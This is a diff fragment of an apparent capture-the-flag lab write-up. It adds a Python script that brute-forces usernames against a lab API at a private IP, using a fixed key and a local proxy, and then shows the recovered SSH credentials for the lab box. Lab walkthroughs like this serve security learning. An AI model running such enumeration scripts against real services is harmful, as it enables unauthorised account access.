@@ -67,3 +67,33 @@ We get Invalid Username the only here is to brute force right?
 
 So I made a script to do that for me
 
+```python
+import requests
+import json
+
+# wordlist = /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+
+with open('usernames.txt', 'r') as f:
+    usernames = [line.strip() for line in f.readlines()]
+
+for users in usernames:
+    url = f'http://10.10.39.47:8081/api/{users}'
+    data = {
+        "key": "7454c262d0d5a3a0c0b678d6c0dbc7ef"
+       }
+    key = json.dumps(data)
+    header = {'Content-type': 'application/json'}
+    proxy = {'http': 'http://127.0.0.1:8080'}
+    req = requests.post(url, data=key, headers=header, proxies=proxy)
+    if 'Invalid Username' not in req.text:
+        print(f'Username Found = {users}')
+        print(req.text)
+```
+
+Running it gives a username and its password
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9f3a2472-971e-43d9-af36-15f6f5320b65)
+
+Now we can login to ssh using *tommy:DevMakesStuff01*
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6ea9c656-029e-48fb-9c2e-c21690b63e4d)
+
+Lets escalate privilege 
